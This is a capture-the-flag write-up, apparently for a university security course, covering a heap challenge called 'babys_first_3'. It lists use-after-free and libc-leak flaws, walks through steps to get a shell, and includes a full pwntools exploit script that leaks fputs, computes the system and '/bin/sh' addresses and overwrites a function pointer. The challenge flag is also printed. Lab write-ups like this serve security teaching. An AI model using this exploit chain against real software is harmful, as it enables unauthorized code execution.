heap 3 | `babys_first_3`
===========================

Flag: `6447{401cb70c-1032-4ffe-8230-f0bbf81e8370}`

General overview of problems faced
-------------------------------------
Had an issue where I was sending 1 extra byte because of the newline being sent with the input when using `sendlineafter()`

List of vulnerabilities
--------------------
1. `Use after free`: It is possible to create a fish, delete it and then view it after it has been deleted and the allocatd bin has been freed.
2. When deleting a fish and freeing an allocated bin, the data is not overwriten/removed from memory. Therefore allocating another bin to the same address allows memory leaks and overwriting of addresses which might still be used because of the UAF vulnerability
3. The heap contains a pointer to the `fputs` function addresses which is used during program execution
4. `Memory leak`: it is possible to leak libc memory addresses which can then be used to calculate `system` and `bin_sh_string` address from it.

Steps to exploit
------------------
1. Create a fish at position 0 with any size, weight and name
2. Delete the fish at position 0
3. Create a fish at position 1 with any size and weight and a name 8 bytes long such as "AAAAAAA\n"
4. View fish at position 1 and record the memory address leaked. (this is the address of fputs)
5. Use a libc database to find the offsets based on the leaked fputs address and the corresponding libc version.
6. calculate the system and "/bin/sh" string libc addresses using the offsets and the fputs address
7. Update the fish's name at position 1 to be : 8 bytes of offset + the address of system in little endian format + the address of bin/sh in little endian format
8. View fish at position 0
9. Congratulations you now have a shell!

Script/Command used
------------------
```python
from pwn import *

# Flag: 6447{401cb70c-1032-4ffe-8230-f0bbf81e8370}

p = remote('wargames.6447.sec.edu.au', 9003)

p.sendlineafter("> ", "1") # create a fish
p.sendlineafter("> ", "0") # at position 0
p.sendlineafter("> ","10") # size
p.sendlineafter("> ","10") # weight
p.sendlineafter("> ","AAAA") # name

p.sendlineafter("> ","4") # delete fish
p.sendlineafter("> ","0") # at position 0

p.sendlineafter("> ","1") # create a fish
p.sendlineafter("> ","1") # at position 1
p.sendlineafter("> ","9") # size
p.sendlineafter("> ","9") # weight
p.sendlineafter("> ","A"*7) # name

p.sendlineafter("> ","3") # view fish
p.sendlineafter("> ","1") # at position 1

mem_leak = p.recvuntil("> ") # receive memory address leak

print mem_leak

leak = mem_leak[8:12].encode("hex")
leak = "".join([leak[i:i+2] for i in range(0, len(leak), 2)][::-1])
leak = int(leak, 16)

system = leak + -0x23d40
bin_sh = leak + 0x1008af

print hex(leak), hex(system), hex(bin_sh)

p.sendline("2") # update a fish
p.sendlineafter("> ","1") # at position 1
p.sendlineafter("> ","115") # size
p.sendlineafter("> ","115") # weight
p.sendlineafter("> ", 'A' * 8 + p32(system) + p32(bin_sh)) # name

p.sendlineafter("> ","3") # view fish
p.sendlineafter("> ","0") # at position 0

print "BOOYYYYAAAAAH! Shell acquired!"
p.interactive()
```


